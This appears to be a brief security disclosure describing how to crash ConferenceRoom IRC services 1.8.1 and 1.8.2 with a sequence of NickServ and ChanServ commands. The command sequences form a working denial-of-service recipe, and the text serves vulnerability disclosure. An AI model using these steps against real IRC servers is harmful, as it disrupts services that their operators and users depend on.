The following exploit has been provided by Murat - 2 &lt;murat@agguvenligi.com&gt;:

ConferenceRoom 1.8.1:

Make to connections to the irc server second being the clone of other. On second connection (clone) type "/ns buddy on". on first connection type "/ns buddy add &lt;clone client nickname&gt;". on clone type "/ns auth accept 1" and the services crashes.

ConferenceRoom 1.8.2:

"/ns buddy on" can't run, cuz professional edt. can't support "buddy" command. Register it one channel, and type it commands "/ns set authorize chanlists on", "/cs aop &lt;#ChannelName&gt; add &lt;NickName&gt;", "/ns auth accept 1". and the services crashes.
